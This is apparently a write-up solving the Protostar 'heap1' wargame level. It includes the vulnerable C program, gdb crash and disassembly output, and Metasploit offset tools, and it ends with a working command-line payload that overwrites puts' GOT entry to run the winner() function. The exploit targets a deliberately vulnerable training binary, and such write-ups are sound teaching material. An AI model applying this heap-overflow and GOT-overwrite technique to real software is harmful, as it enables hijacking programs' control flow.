# Heap 1

This level takes a look at code flow hijacking in data overwrite cases.

This level is at `/opt/protostar/bin/heap1`

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

## Solution

Since I'm lazy, I try to calculate the offset with `pattern_create` and `pattern_offset` from **Kali**:

```console
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

- I ran the program with the precomputed pattern and I got a segfault:

```
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 1111222233334444
Starting program: /opt/protostar/bin/heap1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 1111222233334444

Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x37614136 <Address 0x37614136 out of bounds>, 
    src=0xbffff8a2 "1111222233334444") at strcpy.c:40
40	strcpy.c: No such file or directory.
	in strcpy.c
(gdb)
```

We can see that the program is trying to copy/write what we specified at the second argument, at the address we specified at the first argument.

> Is this a **write-what-where**?

Then we pass the address where we crashed to `pattern_offset`:

```console
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37614136
[*] Exact match at offset 20
```

So it seems we have to print `junk * offset(20) + address_we_want_to_write_to` as the first argument and then `address_of_the_win_func` to succeed.

We have to options for the address we wan to write to:

1. Overwrite `EIP`
2. Overwrite the **GOT**

Let's try the second option.

If we disassemble `main`, we can see that the last function called is `puts`:

```bash
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x080484b9 <main+0>:	push   ebp
0x080484ba <main+1>:	mov    ebp,esp
0x080484bc <main+3>:	and    esp,0xfffffff0
0x080484bf <main+6>:	sub    esp,0x20
0x080484c2 <main+9>:	mov    DWORD PTR [esp],0x8
0x080484c9 <main+16>:	call   0x80483bc <malloc@plt>
0x080484ce <main+21>:	mov    DWORD PTR [esp+0x14],eax
0x080484d2 <main+25>:	mov    eax,DWORD PTR [esp+0x14]
0x080484d6 <main+29>:	mov    DWORD PTR [eax],0x1
0x080484dc <main+35>:	mov    DWORD PTR [esp],0x8
0x080484e3 <main+42>:	call   0x80483bc <malloc@plt>
0x080484e8 <main+47>:	mov    edx,eax
0x080484ea <main+49>:	mov    eax,DWORD PTR [esp+0x14]
0x080484ee <main+53>:	mov    DWORD PTR [eax+0x4],edx
0x080484f1 <main+56>:	mov    DWORD PTR [esp],0x8
0x080484f8 <main+63>:	call   0x80483bc <malloc@plt>
0x080484fd <main+68>:	mov    DWORD PTR [esp+0x18],eax
0x08048501 <main+72>:	mov    eax,DWORD PTR [esp+0x18]
0x08048505 <main+76>:	mov    DWORD PTR [eax],0x2
0x0804850b <main+82>:	mov    DWORD PTR [esp],0x8
0x08048512 <main+89>:	call   0x80483bc <malloc@plt>
0x08048517 <main+94>:	mov    edx,eax
0x08048519 <main+96>:	mov    eax,DWORD PTR [esp+0x18]
0x0804851d <main+100>:	mov    DWORD PTR [eax+0x4],edx
0x08048520 <main+103>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048523 <main+106>:	add    eax,0x4
0x08048526 <main+109>:	mov    eax,DWORD PTR [eax]
0x08048528 <main+111>:	mov    edx,eax
0x0804852a <main+113>:	mov    eax,DWORD PTR [esp+0x14]
0x0804852e <main+117>:	mov    eax,DWORD PTR [eax+0x4]
0x08048531 <main+120>:	mov    DWORD PTR [esp+0x4],edx
0x08048535 <main+124>:	mov    DWORD PTR [esp],eax
0x08048538 <main+127>:	call   0x804838c <strcpy@plt>
0x0804853d <main+132>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048540 <main+135>:	add    eax,0x8
0x08048543 <main+138>:	mov    eax,DWORD PTR [eax]
0x08048545 <main+140>:	mov    edx,eax
0x08048547 <main+142>:	mov    eax,DWORD PTR [esp+0x18]
0x0804854b <main+146>:	mov    eax,DWORD PTR [eax+0x4]
0x0804854e <main+149>:	mov    DWORD PTR [esp+0x4],edx
0x08048552 <main+153>:	mov    DWORD PTR [esp],eax
0x08048555 <main+156>:	call   0x804838c <strcpy@plt>
0x0804855a <main+161>:	mov    DWORD PTR [esp],0x804864b
0x08048561 <main+168>:	call   0x80483cc <puts@plt>
0x08048566 <main+173>:	leave  
0x08048567 <main+174>:	ret    
End of assembler dump.
```

The address of `puts` in the **GOT** is `0x8049774`:

```bash
(gdb) disass 0x80483cc
Dump of assembler code for function puts@plt:
0x080483cc <puts@plt+0>:	jmp    DWORD PTR ds:0x8049774
0x080483d2 <puts@plt+6>:	push   0x30
0x080483d7 <puts@plt+11>:	jmp    0x804835c
End of assembler dump.
(gdb) x/x 0x8049774
0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483d2
```

And the address of the `winner()` function is `0x8048494` as we can we se below:

```bash
(gdb) p winner
$2 = {void (void)} 0x8048494 <winner>
```

So the final payload will be:

```console
user@protostar:/opt/protostar/bin$ ./heap1 $(python -c 'print("A"*20 + "\x74\x97\x04\x08")') $(python -c 'print("\x94\x84\x04\x08")')
and we have a winner @ 1619614186
```
